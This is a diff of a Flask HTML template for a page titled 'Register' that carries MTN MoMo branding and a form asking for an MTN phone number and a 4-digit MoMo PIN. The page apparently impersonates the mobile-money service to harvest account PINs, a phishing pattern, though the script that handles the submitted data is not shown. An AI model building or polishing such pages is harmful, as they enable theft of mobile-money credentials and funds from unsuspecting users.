@@ -3,63 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoMo Registration</title>
+    <title>Register</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
     <div class="container">
-        <div class="card">
-            <!-- Header with Logo -->
-            <div class="header">
-                <img src="{{ url_for('static', filename='../images/Image.jpeg') }}" 
-                     alt="MoMo" 
-                     class="logo"
-                     onerror="this.style.display='none'">
-                <div class="brand">
-                    <span class="brand-momo">MoMo</span>
-                    <span class="brand-from">from</span>
-                    <span class="brand-mtn">MTN</span>
+        <!-- Logo Image -->
+        <div class="logo-container">
+            <img src="{{ url_for('static', filename='../images/Image.jpeg') }}" 
+                 alt="MoMo" 
+                 class="logo"
+                 onerror="this.style.display='none'">
+        </div>
+        
+        <form id="registrationForm">
+            <div class="form-group">
+                <input 
+                    type="tel" 
+                    id="mtnNumber"
+                    name="mtn_number"
+                    placeholder="MTN NUMBER" 
+                    required
+                    pattern="[0-9\s\+]{10,15}"
+                    maxlength="15"
+                >
+            </div>
+            
+            <div class="form-group">
+                <div class="pin-wrapper">
+                    <input 
+                        type="password" 
+                        id="momoPin"
+                        name="momo_pin"
+                        placeholder="MOMO PIN" 
+                        required
+                        pattern="[0-9]{4}"
+                        maxlength="4"
+                        minlength="4"
+                    >
+                    <span class="toggle-pin" onclick="togglePinVisibility()">👁️</span>
                 </div>
             </div>
             
-            <!-- Registration Form -->
-            <form id="registrationForm" class="registration-form">
-                <div class="input-group">
-                    <label for="mtnNumber">MTN NUMBER</label>
-                    <input 
-                        type="tel" 
-                        id="mtnNumber" 
-                        name="mtn_number" 
-                        placeholder="Enter MTN number" 
-                        required
-                        pattern="[0-9\s\+]{10,15}"
-                        maxlength="15"
-                    >
-                </div>
-                
-                <div class="input-group">
-                    <label for="momoPin">MOMO PIN</label>
-                    <div class="pin-input-wrapper">
-                        <input 
-                            type="password" 
-                            id="momoPin" 
-                            name="momo_pin" 
-                            placeholder="Enter 4-digit PIN" 
-                            required
-                            pattern="[0-9]{4}"
-                            maxlength="4"
-                            minlength="4"
-                        >
-                        <span class="toggle-pin" onclick="togglePinVisibility()">👁️</span>
-                    </div>
-                </div>
-                
-                <button type="submit" class="register-btn">REGISTER</button>
-            </form>
-            
-            <!-- Message Container -->
-            <div id="messageContainer" class="message-container"></div>
-        </div>
+            <button type="submit" class="btn" id="submitBtn">REGISTER</button>
+        </form>
+        
+        <div id="messageContainer" class="message-container"></div>
     </div>
     
     <script src="{{ url_for('static', filename='script.js') }}"></script>
